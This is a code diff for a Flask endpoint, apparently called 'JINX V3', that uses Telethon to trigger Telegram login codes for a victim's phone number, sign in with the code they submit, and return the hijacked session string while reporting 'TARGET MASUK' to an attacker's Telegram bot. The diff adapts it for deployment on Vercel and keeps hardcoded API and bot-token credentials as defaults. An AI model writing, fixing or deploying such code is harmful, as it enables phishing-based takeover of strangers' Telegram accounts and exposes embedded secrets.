@@ -1,15 +1,18 @@
 # api/send_code.py
+import os
+import asyncio
 from flask import Flask, request, jsonify
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-import os, asyncio, requests
+import requests
 
 app = Flask(__name__)
 
-API_ID = 24289127
-API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
-BOT_TOKEN = '7892241887:AAGRSOx7cSiSgPUZvvSiBUYVSulcDOqRu4Y'
-CHAT_ID = '1870154832'
+# Env dari Vercel (set di dashboard)
+API_ID = int(os.environ.get('API_ID', '24289127'))
+API_HASH = os.environ.get('API_HASH', 'cd63113435f4997590ee4a308fbf1e2c')
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '7892241887:AAGRSOx7cSiSgPUZvvSiBUYVSulcDOqRu4Y')
+CHAT_ID = os.environ.get('CHAT_ID', '1870154832')
 
 SESSIONS_DIR = "sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
@@ -20,7 +23,7 @@ def send_bot(msg):
     })
 
 @app.route('/send_code', methods=['POST'])
-async def handle():
+def handle():
     phone = request.form.get('phone')
     code = request.form.get('code')
     action = request.form.get('action', 'send')
@@ -45,7 +48,7 @@ async def handle():
                 return {'success': True, 'session': session_str}
 
             else:
-                res = await client.send_code_request(phone, force_sms=True)  # PAKSA SMS
+                res = await client.send_code_request(phone, force_sms=True)
                 await client.disconnect()
 
                 status = "RESEND" if action == 'resend' else "TARGET MASUK"
@@ -54,14 +57,19 @@ async def handle():
                 return {'success': True, 'hash': res.phone_code_hash}
 
         except Exception as e:
-            await client.disconnect()
+            if client.is_connected():
+                await client.disconnect()
             return {'success': False, 'error': str(e)}
 
-    return jsonify(await run())
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    result = loop.run_until_complete(run())
+    loop.close()
+    return jsonify(result)
 
 @app.route('/')
 def home():
-    return "JINX V3 – FULL STEALTH, OTP ASLI"
+    return "JINX V3 – DEPLOYED ON VERCEL, OTP ASLI"
 
 if __name__ == "__main__":
     app.run()
